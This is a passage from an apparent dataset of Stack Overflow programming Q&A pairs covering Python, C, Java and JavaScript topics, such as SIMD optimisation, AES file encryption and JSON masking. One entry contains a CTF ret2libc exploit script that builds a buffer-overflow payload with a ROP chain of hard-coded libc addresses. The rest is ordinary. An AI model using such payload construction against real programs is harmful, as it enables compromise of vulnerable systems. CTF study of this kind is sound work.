I have no clue how to fix this and get SQLAlchemy up and running. I've burned over 1.5 hours on it. The last error listed suggests having 2 versions of python may have something to do with it. 
Your thoughts on a remedy would be appreciated. 
","Ultimately, I resolved this issue ages after I posted the above question. 
The fix was to run all package updates and installs thru Anaconda and do my work in Spyder. 
The lesson learned was simple: Once you start using Anaconda as your go-to environment for all things Python, all updates -- made via conda install or pip -- will be orchestrated and placed in your system by Anaconda by default.
",python
why does the gstreamer quotplay a section of a media filequot example block,"I'm in the process of learning how to build an application in C using gstreamer, and I'm working my way through examples.  In particular, I'm having an issue with the play a section of a media file example on the ""Pipeline manipulation"" section.
Under Ubuntu 24.04, it builds just fine, and runs - but nothing is ever played.  I added some code to the cb_message() callback to see what other messages it's getting - and there are some GST_MESSAGE_BUFFERING messages after setting the pipeline to GST_STATE_PLAYING. I added some debug output there, and it does eventually get to 100% - but still nothing plays, even if I add a call to gst_element_set_state(pipeline, GST_STATE_PLAYING) there.  In case it matters, the URI I've been using is the same one used in other tutorials on the gstreamer site: https://gstreamer.freedesktop.org/data/media/sintel_trailer-480p.webm
So... seems like maybe this example needs updating.  Any suggestions?  It's kind of frustrating when trying to learn something if the examples don't work.  :) :) :)
EDIT: looks like it's only meant to be used with a local file, not a stream?  The same file works fine locally.  I'd love to know why this is the case, and if it's possible to play a section of a file retrieved over the network...
","As Florian Zwoch commented - this example only works with a local file, not a stream.  The same file works fine if retrieved then played via a file:/// URI.
",c
what happens on linux and macos if a process receives a signal while waiting on pthread_cond_wait,"In the Linux manual, in the signal(7) manual page, last section of ""description"", (https://man7.org/linux/man-pages/man7/signal.7.html) it says that a call to pthread_cond_wait interrupted by a signal will fail with EINTR (unless sa_restart was set in the handler)
Again in the linux manual, in the pthread_cond_wait(3) (https://man7.org/linux/man-pages/man3/pthread_cond_wait.3p.html) page it says:

These functions shall not return an error code of [EINTR].

Aren't those two pages contradictory?
On my Mac, using the command line manual I can't even find the page signal(7), and the pthread_cond_wait(2) page has no info about failing with EINTR.
I did a test with the following code on MacOS:
int main(){
    struct sigaction siga;
    memset(&siga, 0, sizeof(siga));
    siga.sa_handler = handle;
    sigaction(SIGINT, &siga, NULL);
    pthread_t thread;
    pthread_create(&thread, 0, task, NULL);
    sleep(2);
    pthread_kill(thread, SIGINT);
    pthread_join(thread, NULL);
    printf(""Ended\n"");
    return 0;
}

void *task(void * arg){
    pthread_cond_t cond;
    pthread_mutex_t mutex;
    pthread_mutex_init(&mutex, NULL);
    pthread_cond_init(&cond, NULL);
    pthread_mutex_lock(&mutex);
    errno = 0;
    int res = pthread_cond_wait(&cond, &mutex);
    printf(""res = %d\n"", res);
    printf(""errno = %d\n"", errno);
    return 0;
}

void handle(int arg){
}

The output is:
res = 0
errno = 260
Ended

I have no idea what this output means.
I think 260 is even outside the range of system errors.
So how does this actually works in Linux and MacOS?
","
Aren't those two pages contradictory?

Pretty much, but see below.
As a rule of thumb, you should go with the more specific source over the more general one.  In this case, that means relying on the pthread_cond_wait()'s manual page for information about the behavior of that function.  Furthermore, I note that the pthread_cond_wait manual page you linked echoes the POSIX specifications for that function, and both of those sources also say:

If a signal is delivered to a thread waiting for a condition variable, upon return from the signal handler the thread resumes waiting for the condition variable as if it was not interrupted, or it shall return zero due to spurious wakeup.

You report:

I did a test with the following code on MacOS [...]
The output is:
res = 0
errno = 260
Ended

I have no idea what this output means.

It means that when interrupted by a signal, your pthread_cond_wait() exercised the option of performing a spurious wakeup, returning 0.  This is not an error per se.

I think 260 is even outside the range of system errors.

It is absolutely irrelevant how the number 260 relates to the range of defined system error numbers.  The value of errno conveys useful information only in the immediate wake of a function call returning a failure code, and then only for those functions that are documented to set errno on error.  pthread_cond_wait is not one of those functions -- instead, it is among those whose return value is the error number.

So how does this actually works in Linux and MacOS?

You should interpret the Linux signal(7) manual page to indicate that on Linux, after being interrupted by a signal, pthread_cond_wait() will be automatically restarted if the handler was registered with the SA_RESTART flag, and otherwise it will return to its caller.  If you like, you can reconcile ""fails with the error EINTR"" with the documented behavior of pthread_cond_signal() by taking the former to be an abstract specification, realized as returning 0 in the unusual case of pthread_cond_wait().  Or you can just count signal(7) as wrong in this detail.
As for MacOS, your own experiment has shown pthread_cond_wait() returning 0 after being interrupted by a signal.  Under other circumstances, the function might be automatically restarted instead.
",c
jena39s getlocalname doesn39t return numeric localname with turtle,"According to the changelog, the Turtle RDF serialization has supported numeric local names since August 2011.  In the following Jena code, the result of getLocalName() on the URI http://www.foo.com/123456 is not 123456.  Is this a bug in Jena?
String turtle = ""<http://www.foo.com/123456>  a  <http://www.foo.com/number>"";
Model model = ModelFactory.createDefaultModel()
    .read(new ByteArrayInputStream(turtle.getBytes(StandardCharsets.UTF_8)), null, ""TURTLE"");

Resource foo = model.listSubjects().next();
String localName = foo.getLocalName();
assert localName.equals(""123456"");

","The code does not indicate a bug.  The Turtle serialization may allow numeric local names but Jena's getLocalName() ""returns the name of this resource within its namespace.""  That's a bit of an underspecification, since it doesn't say what ""its namespace"" is.  However, there's a bit of historical context, too. In the earlier RDF standards, from 2004, RDF/XML was the most common format.  In light of that, it's not surprising that the implementation of getLocalName() in Node_URI uses Util.spltNamespace, which is based on XML's concept of local names.  Util.splitNamespace's documentation refers to finding an NCName, which is an XML concept:

Given an absolute URI, determine the split point between the namespace
  part and the localname part. If there is no valid localname part then
  the length of the string is returned.
The algorithm tries to find the longest NCName at the end of the uri,
  not immediately preceded by the first colon in the string.
@param uri
  @return the index of the first character of the localname

Now, there is one other possible confusion here that it's important to address.  RDF is an abstract data representation.  An RDF graph (or model, as Jena calls them) is just a set of triples.  Turtle, N3, N-Triples, and RDF/XML are just serialization formats for RDF.  A Jena model can be serialized in lots of different formats, but it doesn't keep track of what serialization format its contents were read in from.  (Indeed, you can populate a model without reading triples from any file at all.)  That means that even though Jena will be able to read a Turtle file containing content like:
@prefix : <http://example.org/>.
:12345 a :number .

the model won't know the IRI http://www.example.org/123456 appeared in the file as :123456.  It's worth noting, as AndyS pointed out in the comments, that Jena's Turtle serialization will recognize that the IRI http://example.org/123456 can be written as :123456, and will use that shortened version.
",java
e4 rcp manipulating menu when switching between perspectives,"I am looking for a way how to manipulate the main menu of an e4 RCP application.
The menu should have different items enabled, depending on the current Perspective.
So far, I came up with the solution to use the @CanExecute annotation for each menu handler to check for the active perspective like so:
@CanExecute
public boolean canExecute(MPerspective activePerspective) {
    return (activePerspective.getElementId().equals(""somePerspectiveName""));
}

Is there any better way how to do this?
","If you just want to control if the menu item is enabled/disabled what you have is OK.
You can control the visibility of the menu item by specifying a 'Visible-When Expression' in the 'Handled Menu Item' entry in the Application.e4xmi. Here you specify the id of a 'core expression' defined using the org.eclipse.core.expressions.definitions extension point.
",java
creating a waiting function using processnexttick or setimmediate  nodejs,"I was coding some Node.js and I thought, coming from a Java background, that I should figure out how to create my own ""wait"" functionality. Obviously, it will be a little different since Java is designed to be multi-threaded and Node is not. Anyway, the desired functionality I want in Node is that I want to create a blocking function myself - such that if some boolean in the program is not set, I might want to call process.nextTick() until the boolean gets set.
So it would be:
    var bool = false;

    function foo(){
    var b = baz();
    }

    function baz(){

        while(!bool){
           process.nextTick(function() {
           return baz(arguments);
        });
      }

    return {};
    }

   function setBool(number) {

       setTimeout(function () {
            bool = false;
       }, number);
   }

   process.nextTick(wait);
   setBool(3000);

so this question is twofold:
(1) is this the best way to implement a waiting type functionality in Node.js?
(2) If I called baz(arguments) instead the baz function (recursively) what happens in terms of the execution? Generally, when you want the return value from function X, but function X calls itself a few times before returning, does this pose any problems? Is it no big deal and it turns out to be the same return value? I have thought about this before but never really worried about it or investigated it.
","Do not 'wait' in Node.js. ""Waiting"" blocks ALL other execution. That's an important note because if you block, then the boolean can NEVER set changed. JavaScript, and especially in Node, uses an event driven model. Do this, when that.
So the best way? It's opinion based but this is one way:
var bool = false;

function foo() {
    console.log('Listening for true');
    baz(function() {
        //Do something when called
        console.log('It\'s finally true!');
    });
}

function baz(callback) {
    setImmediate(function() {
        if (bool)
            callback();
        else
            baz(callback);
    });
}

foo();
setTimeout(function() {
    console.log('Setting to true');
    bool = true;
}, 4000);

",javascript
ret2libc strcpy not complete,"I am trying to solve a CTF challenge in which I need to use ret2libc. The problem is that when I try to use strcpy to put some text inside a buffer for latter use, it does not seems to work.
The challenge box still vulnerable to ""ulimit -s unlimited"" so we can fix libc addresses. Here is my current python code:
from pwn import *

def r2lc_print(write_buff,read_buff):
  strcpy_addr=0x55607a40
  pop2ret=0x55643876
  return p32(strcpy_addr)+p32(pop2ret)+p32(write_buff)+p32(read_buff)

buffer_size=172
execlp_addr=0x55643970

c00_str_addr=0x55575d37
a00_str_addr=0x55575d5e
t00_str_addr=0x55575440
write_buff=0x55576858

print cyclic(buffer_size)+r2lc_print(write_buff,c00_str_addr)+r2lc_print(write_buff,a00_str_addr)+r2lc_print(write_buff,t00_str_addr)+""A""*4

I got strcpy address by issuing ""p strcpy"" inside gdb.
The problem is that strcpy does not seem to be complete, as neither of the instructions or calls do any data movement:
   0x55608320 <strncpy>:        push   ebx
   0x55608321 <strncpy+1>:      call   0x556b5c63
   0x55608326 <strncpy+6>:      add    ebx,0x127cce
   0x5560832c <strncpy+12>:     cmp    DWORD PTR [ebx+0x368c],0x0
   0x55608333 <strncpy+19>:     jne    0x5560833a <strncpy+26>
   0x55608335 <strncpy+21>:     call   0x555a48b0
   0x5560833a <strncpy+26>:     lea    eax,[ebx-0x120e54]
   0x55608340 <strncpy+32>:     test   DWORD PTR [ebx+0x36a0],0x4000000
   0x5560834a <strncpy+42>:     je     0x55608370 <strncpy+80>
   0x5560834c <strncpy+44>:     lea    eax,[ebx-0x117f14]
   0x55608352 <strncpy+50>:     test   DWORD PTR [ebx+0x36bc],0x10
   0x5560835c <strncpy+60>:     jne    0x55608370 <strncpy+80>
   0x5560835e <strncpy+62>:     test   DWORD PTR [ebx+0x369c],0x200
   0x55608368 <strncpy+72>:     je     0x55608370 <strncpy+80>
   0x5560836a <strncpy+74>:     lea    eax,[ebx-0x11f554]
   0x55608370 <strncpy+80>:     pop    ebx
   0x55608371 <strncpy+81>:     ret

","I think the code you're seeing at glibc's strncpy symbol does the runtime CPU dispatching during lazy dynamic linking.  It looks like the asm in sysdeps/i386/i686/multiarch/strcpy.S.  This file is built multiple times (via a #include into other files), with the STRCPY macro defined to strcpy, strncpy, and maybe others.
I think it just returns a function pointer for the version of str[n]cpy that should be used, and the dynamic linker code that called it stores that pointer into the PLT and then calls it.

If you compile a tiny C program that calls strncpy twice, you can single-step into the second call and lazy dynamic linking will already be done.
#include <string.h>
int main(int argc, char**argv) {
        strncpy(argv[0], argv[1], 5);
        strncpy(argv[1], argv[2], 5);
}

compile with gcc -m32 -Og foo.c -g.
In Ubuntu 15.10's libc-2.21.0.so, the PLT jump takes you a function outside of any symbol, according to gdb.  (I put set disassembly-flavor intel and layout reg in my ~/.gdbinit to get TUI register and asm ""windows"".)
  >|0xf7e68fa0      push   ebx                           |
   |0xf7e68fa1      mov    edx,DWORD PTR [esp+0x8]       |
   |0xf7e68fa5      mov    ecx,DWORD PTR [esp+0xc]       |
   |0xf7e68fa9      mov    ebx,DWORD PTR [esp+0x10]      |
   |0xf7e68fad      cmp    ebx,0x8                       |
   |0xf7e68fb0      jbe    0xf7e6ba40                    |
   |0xf7e68fb6      cmp    BYTE PTR [ecx],0x0            |
   |0xf7e68fb9      je     0xf7e6aef0                    |
   |0xf7e68fbf      cmp    BYTE PTR [ecx+0x1],0x0        |
   |0xf7e68fc3      je     0xf7e6af10                    |

... eventually a movaps / pcmpeqb / pmovmskb loop.  This function is the real strncpy implementation, and doesn't dispatch to anything else.
",python
how to optimize cellwidth measuring with simd find the first column to have a nonzero byte in an 8x8 block of bytes,"I have an algorithm that measures the width of each cell (8x8) in a bitmap (128x128) by counting the distance from the start of a cell to the first column within it containing only zeroes. If there is no such column, that cell is assigned a width of 8.
Here is the source-code for the program:
#include <stdint.h>

uint8_t bitmap[128][128];  // all 8 bits are used, so 0..255
int widths[16][16];        // any integer type is fine, like uint8_t

void measure_cell(int i, int j)
{
    int x = i * 8;
    int x_end = x + 8;

    /* Horizontal sweep */
    while (x < x_end) {
        int y = j * 8;
        int y_end = y + 8;

        /* Vertical sweep */
        while (y < y_end && !bitmap[y][x])
            ++y;

        /* All-zero column? */
        if (y == y_end)
            break;

        ++x;
    }

    widths[j][i] = 8 - (x_end - x);
}

int main()
{
    /* Load bitmap from file */
    // ...

    /* Calculate widths for each cell */
    for (int j = 0; j < 16; ++j)
        for (int i = 0; i < 16; ++i)
            measure_cell(i, j);

    /* Print widths to stdout */
    // ...

    return 0;
}

Is there any way to speed this up using SIMD? Assume I am targeting x86-64.
","
Vertically OR 8 vectors of row data (so a byte of the result is only 0 if all bytes in the column were zero).
_mm256_loadu_si256 and _mm256_or_si256.
(or aligned load if you use alignas(32) on your array.)
If it's useful, you could instead use pmaxub (_mm_max_epu8) to get the largest value in that column of the cell, also being 0 only if every column is 0.  But if you're not going to use the max value for anything, just use bitwise OR.

Compare / movemask to get a bitmask of which columns were all-zero.
_mm256_cmpeq_epi8(v, _mm256_setzero_si256()) / _mm256_movemask_epi8

Split up that bitmask into 8-bit chunks (cell boundaries) and bit-scan (tzcnt / C++20 std::countr_zero() / C23 stdc_trailing_zeros) to find the position of the first (lowest) zero.
Since you want to clamp the result to 8, actually do stdc_trailing_zeros(mask | (1<<8)), or I guess stdc_trailing_zeros_uc since unsigned char is 8 bits wide on x86.


_mm256_cmpeq_epi8 is AVX2 for __m256i vectors, producing a 32-bit bitmask (4 cells wide).
The same thing works with just SSE2 with __m128i vectors (16 bit mask = 2 cells).

If you have AVX-512, you could vectorize the bit-scan part, too. 63 - vplzcntq can be used as a tzcnt if you use a bithack to isolate the lowest set bit. (And special-case to get 64 instead of -1 I guess?).  You don't need to booleanize into a vector mask (which would restrict you to 256-bit vectors since AVX-512 can only compare into mask registers).  Instead just find the position of the lowest set bit in the 64-bit element, and right-shift by 3 to get index of lowest non-zero byte.  That should conveniently clear the low 3 bits that have unwanted garbage for bit-index inside a byte.
Or store masks to temporary storage somewhere (perhaps the width array before replacing it with counts).  Then later reload with vectors for a vectorized tzcnt per byte.  There isn't a vplzcntb, but a bithack can efficiently set up for vpopcntb (AVX512BITALG in Ice Lake and later).  We'd want to turn the trailing 0s into 1s and clear everything else.
(~v) & (v-1) makes a mask up to and not including the lowest 1 bit, or all-ones for an input of zero.  (Using _mm512_sub_epi8 element size for the subtraction of course.)  This is similar to (x-1) ^ x (scalar blsmsk) which makes a mask up to and including the lowest 1 bit.
See Trying to write a vectorized implementation of Gerd Isenberg's Bit Scan Forward as an exercise for more details.
Also related: https://catonmat.net/low-level-bit-hacks for bithack basics, and https://web.archive.org/web/20231120194321/https://graphics.stanford.edu/%7Eseander/bithacks.html#ZerosOnRightLinear for some bithacks to get ctz directly, rather than feed vpopcntb.  (But that's probably worse: it would still I think need 3 steps of shift/mask/something, and x86 doesn't have 8-bit SIMD shifts.)

Even with just AVX2, there's probably something you can do with vpshufb lookup tables (like the popcount strategy: https://github.com/WojciechMula/sse-popcount/blob/master/popcnt-avx2-lookup.cpp), or perhaps DeBruijn sequences with 16-bit multiplies after isolating the lowest set bit.  See my vectorized BSF answer I linked in the previous section.
This might not be worth it vs. just doing four scalar tzcnt operations since each 32 bits of mask data ends up in a GPR anyway after vpmovmskb.  That's certainly easier and might be fast enough even if it's possible to go a bit faster even without AVX-512.
",c
make eclipse equals  hashcode use getters,"Is it possible to make the default Eclipse ""Generate hashCode() and equals()"" use getters instead of field references? - ie. can I get at the template that it uses?
I'm using Hibernate, and Proxied Objects are only LazyLoaded when getters are used and not from field references. It's an annoyance to be constantly changing it.
The obvious workarounds are to create a template myself or write a plugin - which feels like overkill.
","It's not a solution, rather workaround - but you might try generate equals(), then use 'encapsulate field' refactoring to replace all field acceses to use getters/setters (it works inside class also). 
",java
json pii data masking in java,"I would like to mask certain elements of JSON and print to logs. Masking can be either by substituting by dummy data or removing the key pair .Is there a utility to do the masking in Java ?
E.g.,
given JSON:
{
    ""key1"":""value1"",
    ""key2"":""value2"",
    ""key3"":""value3"",
}

mask key 2 alone and print JSON:
{
    ""key1"":""value1"",
    ""key2"":""xxxxxx"",
    ""key3"":""value3"",
}

or
{
    ""key1"":""value1"",
    ""key3"":""value3"",
}

","You could use jackson to convert json to map, process map and convert map back to json.
For example:
import org.codehaus.jackson.map.ObjectMapper;
import org.codehaus.jackson.type.TypeReference;

public void mask() throws IOException {
String jsonString = ""{\n"" +
            ""    \""key1\"":\""value1\"",\n"" +
            ""    \""key2\"":\""value2\"",\n"" +
            ""    \""key3\"":\""value3\""\n"" +
            ""}"";
    Map<String, Object> map;    

    // Convert json to map
    ObjectMapper mapper = new ObjectMapper();
    try {
        TypeReference ref = new TypeReference<Map<String, Object>>() { };
        map = mapper.readValue(jsonString, ref);
    } catch (IOException e) {
        System.out.print(""cannot create Map from json"" + e.getMessage());
        throw e;
    }

    // Process map
    if(map.containsKey(""key2"")) {
        map.put(""key2"",""xxxxxxxxx"");
    }

    // Convert back map to json
    String jsonResult = """";
    try {
        jsonResult = mapper.writeValueAsString(map);
    } catch (IOException e) {
        System.out.print(""cannot create json from Map"" + e.getMessage());
    }

    System.out.print(jsonResult);

",java
problem with index out of bounds in stringbuilder matrix,"I am making a program to learn how to manage text strings and files in Java, where the user will enter university modules in blocks of time. It's still a prototype, and for now I'm trying to fill an array of StringBuilders with the base structure, so I can then mutate it with the data the user enters.
My method was to create an empty StringBuilder array, of dimension 6X10, fill it with empty strings, and then ""fill"" it with an array of Strings with the basic structure:
import java.util.Arrays;

public class Main {
    public static void main(String[] args) {
        
        StringBuilder[][] baseStructure = new StringBuilder[6][10];
        for(int i = 0; i < 6; i++){
            for(int j = 0; j < 10; j++){
                baseStructure[i][j] = new StringBuilder();
            }
        }


        String[][] baseStructure2 = {
            {""HORA"", ""Lunes"", ""Martes"", ""Miercoles"", ""Jueves"", ""Viernes""},
            {""  8:30 - 9:30"", ""1"", ""2"", ""3"", ""4"", ""5""},
            {"" 9:40 - 10:40"", ""1"", ""2"", ""3"", ""4"", ""5""},
            {""10:50 - 11:50"", ""1"", ""2"", ""3"", ""4"", ""5""},
            {""12:00 - 13:00"", ""1"", ""2"", ""3"", ""4"", ""5""},
            {""13:10 - 14:10"", ""1"", ""2"", ""3"", ""4"", ""5""},
            {""14:20 - 15:20"", ""1"", ""2"", ""3"", ""4"", ""5""},
            {""15:30 - 16:30"", ""1"", ""2"", ""3"", ""4"", ""5""},
            {""16:40 - 17:40"", ""1"", ""2"", ""3"", ""4"", ""5""},
            {""17:50 - 18:50"", ""1"", ""2"", ""3"", ""4"", ""5""}
        };

        for(int m = 0; m < 6; m++){
            for(int n = 0; n < 10; n++){
                printMatrix(baseStructure);
                baseStructure[m][n] = new StringBuilder(baseStructure2[m][n]);
            }
        }

    }

    public static void printMatrix(StringBuilder[][] strMatrix){
        for (StringBuilder[] strings : strMatrix) {
            System.out.println(Arrays.deepToString(strings));
        }
    }

However, even though my loops have the same dimension values, when running the program I get index access errors out of range 6.
WHAT I TRIED:
I tried to populate a StringBuilder matrix, ""copying"" data from a String matrix, printing it as the loop went to see it grow with each iteration.
The program works until it reaches the end of the first row, where it manages to copy the data until the Friday, and then breaks:
[HORA, Lunes, Martes, Miercoles, Jueves, Viernes, , , , ]
[, , , , , , , , , ]
[, , , , , , , , , ]
[, , , , , , , , , ]
[, , , , , , , , , ]
[, , , , , , , , , ]

Exception in thread ""main"" java.lang.ArrayIndexOutOfBoundsException: Index 6 out of bounds for length 6 at Main.main(Main.java:44)

I can tell there's something wonky because the first row should NOT have 4 extra empty spaces, but I'm not sure what's causing it.
(Developed on Java 23.0.1 on IntellliJ IDEA Community Edition 2024.3.1.1)
","It seems like you inverted the dimensions of your 2d array. Which also reflected in both your loops.
You have 10 lines who each have 6 elements per line, not the other way round. :)
The 2d array, instead of 6, 10:
StringBuilder[][] baseStructure = new StringBuilder[10][6];

Loop 1:
for(int i = 0; i < 10; i++){
        for(int j = 0; j < 6; j++){

And loop 2:
for(int m = 0; m < 10; m++){
            for(int n = 0; n < 6; n++){

",java
validate json against xml schema xsd,"Is it possible to validate JSON with an XSD in Java? I have an application where I receive JSON response, and I would like to validate it against existing XSD. Another part of my application uses XML, which is why it would be easiest if they both could validate against the existing XSD. 
","No, XML Schema (XSD) is for validating XML; to validate JSON, see JSON Schema.
I recommend generating schemas by hand for full understanding and full control over the constraints.  However, here are some automated tools that can jumpstart the process:

To convert from JSON Schema to XSD, see jsons2xsd.
To convert from XSD to JSON Schema, see Jsonix Schema Compiler.

Related and also very useful:

To parse from XML to JSON (unmarshal) or serialize JSON to XML
(marshal), see JSONIX.
For a list of implementations, including validators in various languages, see JSON Schema Tooling.

",java
unable to launch webdriveragent because of xcodebuild failure xcodebuild failed with code 65,"I am trying to run appium scripts with below setup:
Appium version : 1.6.4
Xcode : 8.3.2
Mac : 10.12.4
iPhone : 10.3.1

Below is the code I am using to launch safari Browser on iPhone real device.
desCapabilities = new DesiredCapabilities();
desCapabilities.setCapability(""platformName"",""iOS"");
desCapabilities.setCapability(""deviceName"", ""Ananda's iPhone"");
desCapabilities.setCapability(""platformVersion"", ""10.3.1"");
desCapabilities.setCapability(""app"", ""com.apple.mobilesafari"");
desCapabilities.setCapability(""udid"", ""******"");
iOSDriver = new IOSDriver<MobileElement>(new URL(""http://"" + nodeUrl + "":"" + nodeUrlPort + ""/wd/hub""), desCapabilities);

I am getting the error and please find the logs below:
[MJSONWP] Encountered internal error running command: Error: Unable to launch WebDriverAgent because of xcodebuild failure: xcodebuild failed with code 65
at XCUITestDriver.quitAndUninstall$ (../../lib/driver.js:374:15)
at tryCatch (/usr/local/lib/node_modules/appium/node_modules/babel-runtime/regenerator/runtime.js:67:40)
at GeneratorFunctionPrototype.invoke [as _invoke] (/usr/local/lib/node_modules/appium/node_modules/babel-runtime/regenerator/runtime.js:315:22)
at GeneratorFunctionPrototype.prototype.(anonymous function) [as next] (/usr/local/lib/node_modules/appium/node_modules/babel-runtime/regenerator/runtime.js:100:21)
at GeneratorFunctionPrototype.invoke (/usr/local/lib/node_modules/appium/node_modules/babel-runtime/regenerator/runtime.js:136:37)
at process._tickCallback (internal/process/next_tick.js:109:7)

","By following the below steps I have launched the safari browser on iOS real device using Appium.

We need to install WebDriverAgent on Mac using Terminal.
xcodebuild build test -project /usr/local/lib/node_modules/appium/node_modules/appium-xcuitest-driver/WebDriverAgent/WebDriverAgent.xcodeproj -scheme WebDriverAgentRunner -destination id=  -configuration Debug
Run the below command to Open the WebDriverAgent using Xcode.
open /usr/local/lib/node_modules/appium/node_modules/appium-xcuitest-driver/WebDriverAgent/WebDriverAgent.xcodeproj
In Xcode, select the ""Automatically manage signing"" checkbox for both WebDriverAgent and WebDriverAgentLib.
Run the Xcode Project.
Once build succeed, WebDriverAgent app will be installed in iPhone device.
Finally Run the Selenium code to Launch Safari Browser.

",java
how to fix javaxcryptobadpaddingexception given final block not properly padded,"I would like to implement a password safe in java. I have an EncryptionModule with two methods void encrypt(String password, String databaseName) and void decrypt(String password, String databaseName). The methods take the password and filename provided by the user. It should be possible to encrypt/ decrypt a csv file or a mysql database.
When I execute the code I get the following error message:
Caused by: javax.crypto.BadPaddingException: Given final block not properly padded. Such issues can arise if a bad key is used during decryption.
The Exception comes from the decrypt method.
The code of the EncryptionModule:
package com.example.passwordsafe.data;

import com.example.passwordsafe.core.usecases.EncryptionModuleInterface;

import javax.crypto.*;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.*;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;

public class EncryptionModule implements EncryptionModuleInterface {
    private static final String PBKDF_ALGORITHM = ""PBKDF2WithHmacSHA1"";
    private static final String TRANSFORMATION = ""AES/CBC/PKCS5Padding"";
    private static final String ALGORITHM = ""AES"";

    @Override
    public void encrypt(String password, String databaseName) {

        Path path = Paths.get(databaseName);
        if (Files.exists(path)){
            File plaintextFile = new File(databaseName);
            File encryptedFile = new File(databaseName + "".encrypted"");

            doCrypto(Cipher.ENCRYPT_MODE, password, plaintextFile, encryptedFile);

        } else {
            System.out.println(""File does not exist"");
        }

    }

    @Override
    public void decrypt(String password, String databaseName) {

        Path path = Paths.get(databaseName);
        if (Files.exists(path)){
            File encryptedFile = new File(databaseName);
            File plaintextFile = new File(databaseName + "".decrypted"");

            doCrypto(Cipher.DECRYPT_MODE, password, encryptedFile, plaintextFile);

        } else {
            System.out.println(""File does not exist"");
        }

    }

    private void doCrypto (int cipherMode, String password, File inputFile, File outputFile) {
        SecureRandom random = new SecureRandom();
        byte[] salt = new byte[16];
        random.nextBytes(salt);

        KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 1000000, 256);

        try {
            SecretKeyFactory factory = SecretKeyFactory.getInstance(PBKDF_ALGORITHM);
            byte[] key = factory.generateSecret(spec).getEncoded();
            SecretKeySpec keySpec = new SecretKeySpec(key, ALGORITHM);

            byte[] ivBytes = new byte[16];
            random.nextBytes(ivBytes);
            IvParameterSpec iv = new IvParameterSpec(ivBytes);

            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            cipher.init(cipherMode, keySpec, iv);

            FileInputStream inputStream = new FileInputStream(inputFile);
            byte[] inputBytes = new byte[(int) inputFile.length()];
            inputStream.read(inputBytes);

            byte[] encValue = cipher.doFinal(inputBytes);
            byte[] finalCiphertext = new byte[encValue.length+2*16];
            System.arraycopy(ivBytes, 0, finalCiphertext, 0, 16);
            System.arraycopy(salt, 0, finalCiphertext, 16, 16);
            System.arraycopy(encValue, 0, finalCiphertext, 32, encValue.length);

            FileOutputStream outputStream = new FileOutputStream(outputFile);
            outputStream.write(finalCiphertext);

            inputStream.close();
            outputStream.close();

        } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException |
                 IOException | BadPaddingException | InvalidKeySpecException | InvalidAlgorithmParameterException e) {
            throw new RuntimeException(e);
        }

    }
}

The methods are called in main:
package com.example.passwordsafe.presentation.terminal;

import com.example.passwordsafe.core.usecases.*;
import com.example.passwordsafe.data.EncryptionModule;
import com.example.passwordsafe.data.FileAccess;
import com.example.passwordsafe.passwordgenerator.PasswordGenerator;
import java.io.File;

public class MainTerminal {
    public static void main(String[] args) {

        // Create CSV file
        String fileName = ""../passwords.csv"";
        new File(fileName);

        // Create objects
        OutputInterface output = new TerminalOutput();
        DataAccessInterface dataAccessInterface = new FileAccess(fileName);
        PasswordGeneratorInterface passwordGenerator = new PasswordGenerator();
        EncryptionModuleInterface encryptionModule = new EncryptionModule();
        InputInterface inputInterface = new UseCases(output, dataAccessInterface, passwordGenerator, encryptionModule);

        UseCasesInterface useCasesInterface = new UseCases(output, dataAccessInterface, passwordGenerator, encryptionModule);

        TerminalInput terminalInput = new TerminalInput(inputInterface, useCasesInterface);

        // Do Stuff

        // Encryption Module Test
        String password = ""masterpassword"";

        encryptionModule.encrypt(password,fileName);
        encryptionModule.decrypt(password, ""../passwords.csv.encrypted"");

    }
    
}

At first I used the code from: https://www.codejava.net/coding/file-encryption-and-decryption-simple-example, but I gave me the exception: java.security.InvalidKeyException: Invalid AES key length. Then I tried to include the code from Artjom B.s Answer here: How to fix Invalid AES key length?. Now I have the Exception mentioned above.
What can I do to fix the exception?
","You are adding the following to the ciphertext in the file but not using and removing it for the decrypt step. That changes the ciphertext to something with the wrong length/padding for AES.
        byte[] finalCiphertext = new byte[encValue.length+2*16];
        System.arraycopy(ivBytes, 0, finalCiphertext, 0, 16);
        System.arraycopy(salt, 0, finalCiphertext, 16, 16);
        System.arraycopy(encValue, 0, finalCiphertext, 32, encValue.length);

Your decrypt needs to use the written iv and salt to re-generate the key and decrypt like this:
    FileInputStream inputStream = new FileInputStream(inputFile);
    byte[] readEncyptedBytesWithIvAndSaltPrefix = new byte[(int) inputFile.length()];
    inputStream.read(readEncyptedBytesWithIvAndSaltPrefix);
    System.arraycopy(readEncyptedBytesWithIvAndSaltPrefix, 0, ivBytes, 0, 16);
    System.arraycopy(readEncyptedBytesWithIvAndSaltPrefix, 16, salt, 0, 16);
    System.arraycopy(readEncyptedBytesWithIvAndSaltPrefix, 32, inputBytes, 0, readEncyptedBytesWithIvAndSaltPrefix.length - 32);

    // use the ivBytes & salt to setup key and cipher

    // then decrypt
    byte[] encValue = cipher.doFinal(inputBytes);

",java
declare array based on size of another array,"I have an array of color codes, the size of which is known at compile time.  I want to declare another array of the same size.  But the code below throws an error.
I can, of course, declare the size as a global constant and then use that in the declaration of both arrays.  But I don't want to keep adjusting the size constant when I add new colors.  Is there a way to do this?  (The variables are global.)
static const char *colors[] = {""#0000ff"",
                                ""#00ff00"",
                                ""#ff0000"",
                                ""#ffff00"",
                                ""#ff00ff"",
                                ""#00ffff"",
                                ""#ffffff"",
                                ""#000000"",
                                ""#ff8040"",
                                ""#c0c0c0"",
                                ""#808080"",
                                ""#804000""};

static const int NUM_COLORS = sizeof(colors) / sizeof(colors[0]);
static ColorButtons color_buttons[NUM_COLORS];

","The size of a file scope array, if specified, must be an integer constant expression.  A variable qualified with const does not qualify as such as expression (this differs from C++ which does allow this).
Instead of making NUM_COLORS a variable, make it a preprocessor symbol:
#define NUM_COLORS  (sizeof(colors) / sizeof(colors[0]))

The expression that this expand to is an integer constant expression, and can therefore be used as the size of an array.
The only thing you'll need to look out for is to make sure you don't redefine colors at a lower scope where you would also use NUM_COLORS.
",c
